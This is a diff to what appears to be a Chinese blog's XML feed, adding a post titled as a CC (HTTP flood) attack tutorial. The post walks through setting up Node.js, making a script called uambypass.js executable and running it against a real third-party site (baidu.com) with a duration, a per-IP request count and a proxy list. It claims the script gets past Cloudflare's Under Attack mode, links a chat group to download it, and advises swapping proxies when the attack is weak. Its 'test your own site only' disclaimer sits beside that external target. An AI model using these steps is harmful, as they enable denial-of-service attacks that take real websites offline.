@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CC攻击教程，一看就会（仅供参考）</title>
+      <link href="/archives/50a9f1de.html"/>
+      <url>/archives/50a9f1de.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="CC攻击部署教程："><a href="#CC攻击部署教程：" class="headerlink" title="CC攻击部署教程："></a>CC攻击部署教程：</h1><p><img src="https://www.helloimg.com/images/2023/06/11/os6EAX.jpg" alt="image.png"><br><img src="https://www.helloimg.com/images/2023/06/11/os6J0g.png" alt="image.png"></p><p>首先布置js环境,使用centos7做的演示:</p><span class="p left logo h3">第一步：管理员权限使用curl命令从url下载软件包</span><pre class="line-numbers language-none"><code class="language-none">curl --silent --location https://rpm.nodesource.com/setup_10.x | sudo bash -   </code></pre><span class="p left logo h3">第二步：管理员权限使用yum安装nodejs</span><pre class="line-numbers language-none"><code class="language-none">sudo yum -y install nodejs</code></pre><span class="p left logo h3">第三步：查找node所在位置</span><pre class="line-numbers language-none"><code class="language-none">whereis node</code></pre><span class="p left logo h3">第四步：输入命令node，如果出现版本号 &gt; 则安装js环境成功</span><p>b</p><div class="note blue anzhiyufont anzhiyu-icon-bullhorn disabled"><p>CC攻击必须安装node环境，可自行百度 “如何安装node.js”</p></div><span class="p left logo h3">第第五步：安装CC脚本，上传至服务器或本地linux系统</span><span class="p left logo h3">第六步：给脚本权限</span><pre class="line-numbers language-none"><code class="language-none">chmod 777 uambypass.js</code></pre><span class="p left logo h3">第七步：运行脚本</span><pre class="line-numbers language-none"><code class="language-none">node uambypass.js https://www.baidu.com/ 60 100 http.txt</code></pre><p><img src="https://www.helloimg.com/images/2023/06/11/osD4yM.png" alt="image.png"></p><span class="p left logo h3">注意：</span><ul><li>如遇报错，使用 yum clean all 清理yum包即可</li><li>url需要填写完整</li><li>脚本运行指令：60为测压时间 单位为秒 100是每个IP请求数  http.txt为你的代理IP</li><li>此脚本对IP代理池要求极高  不然效果很差 可穿 <span class="p blue">Cloudflare</span> <span class="p green">UAM</span>盾</li><li>如果攻击效果不明显，请更换代理ip（即httpc.txt）</li></ul><p>来自群友分享CC脚本 <a class="btn-anzhiyu outline" href="http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&amp;k=LgL23i6a8j0ZnbDTPQsBqWn0JsFTD3BU&amp;authKey=m6N3E3rJRJZL6CVwRPfpkv2p0T2CX%2B5ZFfW2j38kKV5QHwS0IHLl7ER%2BxE%2B1B9jN&amp;noverify=0&amp;group_code=814449041" title="下载"><i class="anzhiyufont anzhiyu-icon-circle-arrow-right"></i><span>下载</span></a></p><p>温馨提示：仅供测试自己站点 <img no-lazy="" class="inline" src="https://bu.dusays.com/2022/05/19/6285328a83ca7.gif" style="height:40px;"> 勿输入正规网址，本章图片均来自互联网收集<img no-lazy="" class="inline" src="https://bu.dusays.com/2023/06/01/647895232e5d5.webp" style="height:1.5em"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 测压 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CC攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>关于CC攻击，网络攻击</title>
       <link href="/archives/428e76ab.html"/>
       <url>/archives/428e76ab.html</url>
